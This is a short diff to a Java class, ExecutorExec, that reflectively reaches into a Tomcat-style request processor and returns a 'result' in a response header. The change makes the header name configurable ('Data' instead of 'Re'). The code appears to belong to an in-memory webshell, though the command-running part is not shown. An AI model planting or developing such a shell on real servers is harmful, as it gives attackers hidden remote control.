@@ -21,6 +21,7 @@ import java.util.concurrent.TimeUnit;
 public class ExecutorExec implements InvocationHandler {
     private static String HEADER;
     private Object targetObject;
+    private String responseHeader = "Data";
 
     public ExecutorExec() {
     }
@@ -81,7 +82,7 @@ public class ExecutorExec implements InvocationHandler {
             Object req = getFieldValue(processor, "req");
             Object response = req.getClass().getMethod("getResponse").invoke(req);
 
-            invokeMethod(response, "addHeader", new Class[]{String.class, String.class}, new Object[]{"Re", result});
+            invokeMethod(response, "addHeader", new Class[]{String.class, String.class}, new Object[]{responseHeader, result});
 
             // todo
             // doWrite() Http11InputBuffer.java:434  报错 java.lang.IllegalArgumentException  待分析
